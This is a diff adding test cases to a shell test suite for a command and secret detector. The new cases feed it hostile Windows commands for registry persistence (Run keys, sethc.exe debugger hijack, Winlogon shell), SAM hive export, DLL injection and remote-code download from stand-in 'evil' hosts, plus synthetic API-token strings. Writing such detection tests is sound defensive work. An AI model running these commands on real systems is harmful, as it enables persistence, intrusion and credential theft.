@@ -11671,6 +11671,66 @@ check "url: cydia flagged" "$(./hlse_core 'cydia://evil' | head -1 | grep -c 'LO
     && check "secret FP guard: ssws prose clean" "0" "0" \
     || check "secret FP guard: ssws prose clean" "0" "1"
 
+# ── cycle-223: registry persistence + LOLBAS wave-7 + secrets wave-6 ─
+for c in \
+    'ieexec http://evil/app.exe' \
+    'infdefaultinstall c:\evil.inf' \
+    'msdeploy -verb:sync -source:package=e.zip' \
+    'rasdial /phonebook:e.pbk' \
+    'regedit /s evil.reg' \
+    'regedit evil.reg' \
+    'regedit /e out.reg "HKLM\SAM"' \
+    'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v x /d y' \
+    'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /d y' \
+    'reg add "HKLM\SYSTEM\CurrentControlSet\Control\SilentProcessExit\notepad.exe" /v MonitorProcess /d y' \
+    'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d y' \
+    'winrs -r:http://evil cmd' \
+    'tttracer.exe -out x.run evil.exe' \
+    'ttdinject.exe /dll evil.dll /pid 4'; do
+    ./hlse_core paste "$c" 2>&1 | grep -qE 'ALERT|BLOCK|ISOLATE' \
+        && check "paste: $c flagged" "0" "0" \
+        || check "paste: $c flagged" "0" "1"
+done
+for c in 'rasdial /disconnect' 'rasdial entry user pass' 'regedit' \
+         'the regedit tool opens the registry' \
+         'regedit /e bk.reg "HKCU\Software\MyApp"' \
+         'reg query HKLM\SOFTWARE' \
+         'reg add HKCU\Software\MyApp /v opt /d 1' \
+         'winrs /?' 'msdeploy /?' 'ieexec' 'tttracer' \
+         'infdefaultinstall' 'rasdial'; do
+    ./hlse_core paste "$c" 2>&1 | grep -q '^OK' \
+        && check "paste FP guard: $c clean" "0" "0" \
+        || check "paste FP guard: $c clean" "0" "1"
+done
+
+for t in \
+    'k: rubygems_f3a1b2c4d5e6f7''a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4' \
+    'k: nvapi-7kQ2wEr8Tyu1IoP3aSd4FgH6jKl9ZxC5vBn2mQwE' \
+    'k: pnu_k8j2h4g6f1d3s5a7q9w2e4r6t8y1u3i5o7p' \
+    'k: apify_api_9z8x7c6v5b4n3m2l1k0j9h8g7f6d5s4a3p2o' \
+    'k: pul-9f8e7d6c5b4a39281706f5e4d3c2b1a09876' \
+    'k: pat-na1-a1b2c3d4-''e5f6-7890-abcd-ef1234567890' \
+    'k: pat-eu1-f1e2d3c4-b5a6-''7890-fedc-ba0987654321' \
+    'k: cqt_rQb7p2Y8xK4n9T1mW6zL3vS5dG0hF2jN8cA' \
+    'k: ckey_bZ4t9R1w7Q3p6Y2xK5n8T0mW3zL6vS9dG1hF4' \
+    'k: FQoGZXIvYXdzEMn8K2pQ7sT4vB9nC1xR3wY6zL5dG2hF0' \
+    'k: Atza|IwEBIKoZtLc0sN8WBJF7T5vX9qD2hY3mG4kR1eC6uA' \
+    'k: Y2lzY29zcGFyazovL3VzL1BFT1BMRS8xMjM0NTY3OC05' \
+    'k: access_token$production$abcdef0123456789$abcdef0123456789abcdef0123' \
+    'k: access_token$sandbox$9z8y7x6w5v4u3t2s$1r0q9p8o7n6m5l4k3j2i1h0g' \
+    'k: sk-mzr8qk2xw4vtp6n1c3g7f9j0h5s2d8l4b6y3e1a7'; do
+    ./hlse_core secret "$t" 2>&1 | grep -qE 'ALERT|BLOCK|ISOLATE' \
+        && check "secret: ${t:3:28} flagged" "0" "0" \
+        || check "secret: ${t:3:28} flagged" "0" "1"
+done
+for t in 'k: sk-proj-abc123def456' 'k: key-exchange-2024-draft' \
+         'k: api key-foo' 'k: pul-short' 'k: pat-name-of-user' \
+         'my access_token is fine'; do
+    ./hlse_core secret "$t" 2>&1 | grep -q 'no credentials' \
+        && check "secret FP guard: ${t:0:30} clean" "0" "0" \
+        || check "secret FP guard: ${t:0:30} clean" "0" "1"
+done
+
 # ── cycle-222: LSASS-dump + account/exfil LOLBin wave ────────────────
 for c in \
     'procdump -ma lsass.exe out.dmp' \
